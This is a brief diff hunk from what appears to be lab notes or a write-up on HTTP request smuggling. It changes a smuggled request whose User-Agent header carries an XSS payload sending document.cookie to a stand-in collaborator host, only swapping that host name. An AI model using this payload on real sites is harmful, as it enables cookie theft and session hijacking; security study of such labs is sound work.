@@ -472,7 +472,7 @@ Transfer-Encoding: chunked
 0
 
 GET /post?postId=4 HTTP/1.1
-User-Agent: a"/><script>document.location='http://COLLABORATOR.oastify.com/?Hack='+document.cookie;</script>
+User-Agent: a"/><script>document.location='http://COLLABORATOR.com/?Hack='+document.cookie;</script>
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 5
 
